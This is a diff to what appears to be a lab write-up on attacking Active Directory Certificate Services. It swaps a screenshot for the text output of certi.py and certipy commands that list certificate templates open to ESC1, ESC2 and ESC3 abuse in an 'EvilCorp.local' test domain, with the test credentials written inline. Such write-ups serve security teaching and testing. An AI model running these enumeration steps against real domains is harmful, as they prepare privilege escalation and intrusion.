@@ -120,12 +120,23 @@ certipy find 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1' -bloodhound
 Another good tool is [certi](https://github.com/zer1t0/certi) from [@eloypgz](https://twitter.com/eloypgz):
 
 ```
-python3 certi.py list 'EvilCorp.local/TheHorseman:EvilCorp3.' -k --dc-ip EVILDC1 --vuln --enable | grep ESC1 -B 3
+python3 certi.py list 'EvilCorp.local/TheHorseman:EvilCorp3.' -k --dc-ip EVILDC1 --vuln --enable | grep ESC1 -B 3 :
+
+Name: SubCA
+Schema Version: 1
+Enroll Services: EvilCorp-EVILDC1-CA
+Vulnerabilities: ESC1 - SAN Impersonation, ESC2 - Any Purpose, ESC3.2 - Use Agent Certificate
+--
+      S-1-5-21-789939560-103138351-2482480773-512 EvilCorp\Domain Admins
+      S-1-5-21-789939560-103138351-2482480773-519 EvilCorp\Enterprise Admins
+
+Name: Vulnerable ESC1
+Schema Version: 2
+Enroll Services: EvilCorp-EVILDC1-CA
+Vulnerabilities: ESC1 - SAN Impersonation
+
 ```
 
- <p align="center">
-  <img src="https://github.com/RayRRT/ADCS/blob/main/certiEvidence.png?raw=true"/>
-</p>
 
 
 <a name="ECS1"></a>
